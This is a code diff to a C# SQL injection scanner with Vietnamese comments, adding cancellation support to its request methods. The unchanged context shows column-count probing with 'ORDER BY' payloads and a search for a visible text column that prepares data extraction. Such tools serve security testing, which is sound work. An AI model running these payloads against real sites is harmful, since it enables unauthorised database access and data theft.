@@ -20,7 +20,8 @@ namespace SQLiScanner.Modules
         public async Task<int> GetColumnCountAsync(
             CrawlResult target, 
             DetectionResult detectedData, 
-            PayloadState trackingState)
+            PayloadState trackingState,
+            CancellationToken cancellationToken = default)
         {
             trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, "Đang dò số cột bằng ORDER BY...");
 
@@ -28,14 +29,14 @@ namespace SQLiScanner.Modules
                 ? bodyVal
                 : (System.Web.HttpUtility.ParseQueryString(target.RawQueryString)[detectedData.VulnerableParam] ?? "");
 
-            int baseLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, originalValue);
+            int baseLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, originalValue, cancellationToken);
 
             if (baseLength <= 0) return -1;
 
             for (int i = 1; i <= 50; i++)
             {
                 string payload = $"{originalValue}{detectedData.WorkingPrefix} ORDER BY {i}{detectedData.WorkingSuffix}";
-                int currentLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, payload);
+                int currentLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, payload, cancellationToken);
 
                 bool isError = Math.Abs(currentLength - baseLength) > baseLength * 0.2;
 
@@ -57,7 +58,8 @@ namespace SQLiScanner.Modules
             CrawlResult target, 
             DetectionResult detectedData, 
             int colCount,
-            PayloadState trackingState)
+            PayloadState trackingState,
+            CancellationToken cancellationToken = default)
         {
             trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang tìm cột Text trong {colCount} cột...");
             List<int> visibleCols = new List<int>();
@@ -82,7 +84,7 @@ namespace SQLiScanner.Modules
                 try
                 {
                     // Ở đây ta cần HTML string để tìm text '9901'
-                    string? html = await SendPayloadGetStringAsync(target, detectedData.VulnerableParam, payload);
+                    string? html = await SendPayloadGetStringAsync(target, detectedData.VulnerableParam, payload, cancellationToken);
 
                     if (!string.IsNullOrEmpty(html) && html.Contains(magicTag))
                     {
@@ -96,17 +98,19 @@ namespace SQLiScanner.Modules
         }
 
         #region Các hàm phụ trợ
-        private async Task<int> GetResponseLengthAsync(CrawlResult target, string paramKey, string payloadValue)
+        private async Task<int> GetResponseLengthAsync(
+            CrawlResult target, string paramKey, string payloadValue, CancellationToken cancellationToken = default)
         {
             try
             {
-                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue);
+                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue, cancellationToken);
                 return bytes == null ? -1 : bytes.Length;
             }
             catch { return -1; }
         }
 
-        private async Task<byte[]?> SendPayloadGetBytesAsync(CrawlResult target, string injectKey, string injectValue)
+        private async Task<byte[]?> SendPayloadGetBytesAsync(
+            CrawlResult target, string injectKey, string injectValue, CancellationToken cancellationToken = default)
         {
             try
             {
@@ -156,11 +160,12 @@ namespace SQLiScanner.Modules
             }
         }
 
-        private async Task<string?> SendPayloadGetStringAsync(CrawlResult target, string paramKey, string payloadValue)
+        private async Task<string?> SendPayloadGetStringAsync(
+            CrawlResult target, string paramKey, string payloadValue, CancellationToken cancellationToken = default)
         {
             try
             {
-                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue);
+                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue, cancellationToken);
                 return bytes == null ? "" : System.Text.Encoding.UTF8.GetString(bytes);
             }
             catch { return ""; }
